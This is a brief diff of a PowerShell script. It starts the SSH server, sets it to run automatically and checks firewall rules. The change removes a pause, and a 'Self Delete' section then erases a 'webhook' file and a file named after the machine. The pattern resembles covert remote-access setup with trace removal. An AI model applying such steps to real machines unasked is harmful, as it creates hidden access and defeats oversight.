@@ -98,8 +98,6 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
 
-pause
-
 ## Self Delete
 Remove-Item "webhook"
 Remove-Item "$env:computername.fk"
